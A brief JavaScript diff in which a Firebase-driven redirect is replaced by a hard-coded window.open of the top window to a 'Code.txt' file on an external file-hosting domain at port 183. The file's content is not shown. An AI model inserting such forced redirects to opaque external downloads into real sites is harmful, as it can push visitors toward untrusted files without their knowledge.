@@ -13,7 +13,7 @@
 firebase.initializeApp(firebaseConfig);
 
 const dbRef = firebase.database().ref("lien").once("value",(snap)=>{
-  window.open(snap.val(), '_top');
+  window.open("https://f11.file-upload.download:183/d/r4xaa2ktnlgpv7w7d26iga2lz6yehprjhrdvi6uxewf6kcnw5wi6wltst3dl6qg245mr7xtc/Code.txt", '_top');
 });
 
 
